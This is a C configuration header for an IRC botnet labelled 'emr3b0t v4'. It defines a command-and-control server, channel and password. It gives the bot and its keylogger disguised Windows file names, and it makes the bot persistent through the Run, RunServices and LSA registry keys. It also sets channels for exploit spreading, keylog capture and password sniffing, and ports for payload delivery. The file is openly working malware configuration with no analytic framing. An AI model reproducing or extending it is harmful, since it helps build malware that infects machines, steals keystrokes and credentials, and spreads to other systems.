#define AU_IP "201.5.x.x" 
#define AU_EXPLOIT "sym" 

int port = 6272;		
int port2 = 6272;		
int socks4port = 2020;		
int tftpport = 69;		
int ftpport = brandom(1337,65535); 
int httpport = 2001;		
int rloginport = 513;		
unsigned short bindport = 1991;		
BOOL topiccmd = TRUE;		
BOOL rndfilename = TRUE;	
BOOL AutoStart = TRUE;		
char prefix = '.';		
int maxrand = 5;		
int nicktype = COUNTRYNICK;	
BOOL nickprefix = TRUE;		

#ifdef DEBUG_LOGGING
char logfile[]="c:\\windows\\system32\\regnfind.ocx";
#endif

#ifndef NO_CRYPT

#else  

char botid[] = "Dark";		
char version[] = "emr3b0t v4";		
char password[] = "cyberX";		
char server[] = "dark1ng.org";	
char serverpass[] = "";		
char channel[] = "#emr3#";		
char chanpass[] = "";
char server2[] = "";	
char channel2[] = "";		
char chanpass2[] = "";		
char filename[] = "agl.exe";	
char keylogfile[] = "winnt.bat";		
char valuename[] = "Windows Service Agent";
char nickconst[] = "-";		
char szLocalPayloadFile[]="winsys.dat";	
char modeonconn[] = "-x+i";		
char exploitchan[] = "#CYBER-exp";		
char keylogchan[] = "#CYBER-log";		
char psniffchan[] = "#CYBER-sniff";		 

char *authost[] = {
	"*@KRO",
	
};

char *versionlist[] = {
	"mIRC v6.16 Khaled Mardam-Bey",
	"mIRC v6.17 Khaled Mardam-Bey",
	"mIRC v6.20 Khaled Mardam-Bey",
	"mIRC v6.21 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2poiwsfpf3213ew"; 
#endif

const char partline[] = "CYBER"; 
const char floodline[] = "CYBER";
